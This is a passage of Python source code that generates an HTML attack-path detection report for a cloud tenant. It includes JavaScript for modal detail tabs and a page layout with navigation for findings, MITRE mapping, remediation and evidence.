  html += '</div>';
  return html;
}
function _seqSwitchTab(tabName, btnEl){
  var modal = document.getElementById('seq-modal');
  if(!modal) return;
  var tabs = modal.querySelectorAll('.seq-mtab-btn');
  for(var i=0;i<tabs.length;i++) tabs[i].classList.remove('active');
  if(btnEl) btnEl.classList.add('active');
  var step = null;
  try { step = JSON.parse(modal.dataset.step || '{}'); } catch(e){ step = {}; }
  var body = modal.querySelector('.seq-mtab-content');
  if(!body) return;
  if(tabName === 'exec') body.innerHTML = _seqRenderExecTab(step);
  else if(tabName === 'tech') body.innerHTML = _seqRenderTechTab(step);
  else if(tabName === 'mit') body.innerHTML = _seqRenderMitTab(step);
}
function _seqShowDetailGeneric(host){
  if(!host) return;
  var titleEl = host.querySelector('.seq-e-title') || host.querySelector('.seq-ea-title');
  var flowEl  = host.querySelector('.seq-e-flow')  || host.querySelector('.seq-ea-flow');
  var step = null;
  try { if(host.dataset && host.dataset.step) step = JSON.parse(host.dataset.step); } catch(e){}
  if(!step) step = {};
  var overlay = document.getElementById('seq-modal-overlay');
  var modal = document.getElementById('seq-modal');
  if(!overlay || !modal) return;
  // Escape any transformed/filtered ancestor (prevents the popup from looking blurred).
  if(modal.parentNode !== document.body) document.body.appendChild(modal);
  if(overlay.parentNode !== document.body) document.body.appendChild(overlay);
  // Persist step for tab switching
  try { modal.dataset.step = JSON.stringify(step); } catch(e){}
  var hasMit = !!(step.mitigation_now || step.mitigation_soon || step.mitigation_long || step.verify_query || step.references);
  var hasExec = !!(step.summary || step.business_impact || step.real_world);
  var tabs = '<div class="seq-mtab-bar">';
  if(hasExec) tabs += '<button class="seq-mtab-btn active" onclick="_seqSwitchTab(\\'exec\\', this)">📋 Executive Summary</button>';
  tabs += '<button class="seq-mtab-btn' + (hasExec?'':' active') + '" onclick="_seqSwitchTab(\\'tech\\', this)">🔬 Technical Details</button>';
  if(hasMit) tabs += '<button class="seq-mtab-btn" onclick="_seqSwitchTab(\\'mit\\', this)">🛡️ Mitigation Playbook</button>';
  tabs += '</div>';
  modal.querySelector('.seq-modal-body').innerHTML =
    '<h3 style="margin:0 0 8px;font-size:17px;color:var(--text)">' + (titleEl?titleEl.innerHTML:'Step Detail') + '</h3>' +
    (flowEl ? '<div style="margin:0 0 14px;padding:10px;background:var(--bg-card);border-radius:6px;font-size:13px">' + flowEl.innerHTML + '</div>' : '') +
    tabs +
    '<div class="seq-mtab-content">' + (hasExec ? _seqRenderExecTab(step) : _seqRenderTechTab(step)) + '</div>';
  overlay.style.display = 'block'; modal.classList.add('open'); modal.style.display = 'flex';
}
function _seqShowDetail(btn){ _seqShowDetailGeneric(btn.closest('.seq-explain')); }
function _seqShowDetailFromCard(btn){ _seqShowDetailGeneric(btn.closest('.seq-ea-card')); }
function _seqCloseDetail(){
  var o = document.getElementById('seq-modal-overlay');
  var m = document.getElementById('seq-modal');
  if(o) o.style.display = 'none';
  if(m){ m.classList.remove('open'); m.style.display = 'none'; }
}
(function(){
  var o = document.getElementById('seq-modal-overlay');
  if(o) o.addEventListener('click', _seqCloseDetail);
})();
"""


# ── Main Generator ──────────────────────────────────────────────────────

def generate_html_report(assessment: dict) -> str:
    """Generate the full enterprise-grade HTML report."""
    summary = assessment.get("Summary", {})
    paths = assessment.get("Paths", [])
    tenant = assessment.get("TenantId", "unknown")
    ts = assessment.get("AssessmentTimestamp", "")
    ev_types = assessment.get("EvidenceTypes", {})
    errors = assessment.get("CollectionErrors", [])
    score = summary.get("OverallRiskScore", 0)
    counts = summary.get("SeverityCounts", {})
    trend = summary.get("Trend")

    compliance_map = _load_compliance_map()

    # Group by type for nav
    by_type: dict[str, list[dict]] = {}
    for p in paths:
        by_type.setdefault(p.get("Type", "unknown"), []).append(p)

    # Top-nav findings dropdown items
    type_order = [
        "privilege_escalation", "compromised_identity", "pim_escalation",
        "ca_bypass", "network_pivot", "lateral_movement",
        "credential_chain", "custom_role_escalation",
        "exposed_high_value", "consent_abuse",
        "data_exposure", "ai_attack_surface", "cross_tenant",
    ]
    findings_nav_items = ""
    for ptype in type_order:
        if ptype in by_type:
            label = _TYPE_LABELS.get(ptype, ptype)
            icon = _TYPE_ICONS.get(ptype, "")
            findings_nav_items += f'      <a href="#type-{ptype}">{icon} {_esc(label)} ({len(by_type[ptype])})</a>\n'

    # Build report sections
    sections = [
        _doc_control_section(assessment),
        _executive_summary_section(summary, paths),
        _category_cards_section(paths),
        _trend_section(trend),
        _mitre_heatmap_section(paths),
        _priority_quadrant_section(paths),
        _remediation_impact_section(paths, score),
        _all_findings_section(paths, compliance_map),
        _evidence_section(ev_types, errors),
        _methodology_section(),
    ]

    now = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC")

    return f"""<!DOCTYPE html>
<html lang="en" data-theme="dark">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Attack Path Detection Report — {_esc(tenant)}</title>
<style>
{_shared_css()}
{_report_css()}
</style>
</head>
<body>
<a class="skip-nav" href="#exec-summary">Skip to Executive Summary</a>

<!-- Top Navigation -->
<nav class="top-nav" aria-label="Report sections">
  <span class="brand" aria-hidden="true">&#128737; Attack Path Detection</span>
  <div class="nav-dropdown">
    <button class="nav-toggle">Document Control</button>
    <div class="nav-menu">
      <a href="#doc-control">Report Metadata</a>
    </div>
  </div>
  <div class="nav-dropdown">
    <button class="nav-toggle">Executive Summary</button>
    <div class="nav-menu">
      <a href="#exec-summary">Overview &amp; KPIs</a>
      <a href="#exec-summary" onclick="setTimeout(function(){{document.querySelector('.score-display').scrollIntoView({{behavior:'smooth'}})}},50)">Security Score</a>
      <a href="#exec-summary" onclick="setTimeout(function(){{document.querySelector('.sev-bars').scrollIntoView({{behavior:'smooth'}})}},50)">Severity Breakdown</a>
    </div>
  </div>
  <div class="nav-dropdown">
    <button class="nav-toggle">Categories</button>
    <div class="nav-menu">
      <a href="#categories">Category Cards</a>
    </div>
  </div>
  <div class="nav-dropdown">
    <button class="nav-toggle">Analytics</button>
    <div class="nav-menu">
      <a href="#mitre">MITRE ATT&amp;CK</a>
      <a href="#priority">Priority Quadrant</a>
      <a href="#remediation-impact">Remediation Impact</a>
    </div>
  </div>
  <div class="nav-dropdown">
    <button class="nav-toggle">All Findings</button>
    <div class="nav-menu">
      <a href="#all-findings">All Attack Paths</a>
      <div class="nav-sep"></div>
{findings_nav_items}    </div>
  </div>
  <div class="nav-dropdown">
    <button class="nav-toggle">Reference</button>
    <div class="nav-menu">
      <a href="#evidence">Evidence</a>
      <a href="#methodology">Methodology</a>
    </div>
  </div>
  <div class="zoom-controls no-print" aria-label="Page zoom">
    <button onclick="zoomOut()" aria-label="Zoom out" data-tip="Decrease page zoom level by 10%.">&minus;</button>
    <span id="zoom-label">100%</span>
    <button onclick="zoomIn()" aria-label="Zoom in" data-tip="Increase page zoom level by 10%.">&plus;</button>
    <button onclick="zoomReset()" aria-label="Reset zoom" data-tip="Reset page zoom to 100%." style="font-size:11px">Reset</button>
  </div>
  <button class="theme-btn" onclick="toggleTheme()" aria-label="Toggle dark and light theme"
          data-tip="Switch between dark and light colour themes for readability.">Switch to Light</button>
</nav>

<main id="main-content" class="full-width-content">
    <h1 class="page-title">Attack Path Detection Report</h1>
    <div class="meta-bar">
      <span>Tenant: <code>{_esc(tenant)}</code></span>
      <span>Generated: {_esc(ts[:19] if ts else now)}</span>
      <span>Paths: {len(paths)}</span>
      <span>Score: {score}/100</span>
    </div>

    {"".join(sections)}

    <footer style="text-align:center;padding:32px 0;color:var(--text-muted);font-size:12px;border-top:1px solid var(--border);margin-top:48px">
      EnterpriseSecurityIQ — Attack Path Detection &copy; {datetime.now().year}.
      Generated automatically on {_esc(now)}. Classification: CONFIDENTIAL.
    </footer>
</main>

<button class="back-to-top" aria-label="Back to top">↑</button>

<div id="fw-backdrop"></div>
<div id="ciq-tooltip" aria-hidden="true"></div>

<div id="seq-modal-overlay" class="seq-modal-overlay"></div>
<div id="seq-modal" class="seq-modal">
  <div class="seq-modal-hdr"><span>Step Details</span><button class="seq-modal-close" onclick="_seqCloseDetail()">&times;</button></div>
  <div class="seq-modal-body"></div>
</div>

<script>
{_shared_js()}
{_report_js()}
</script>
</body>
</html>"""
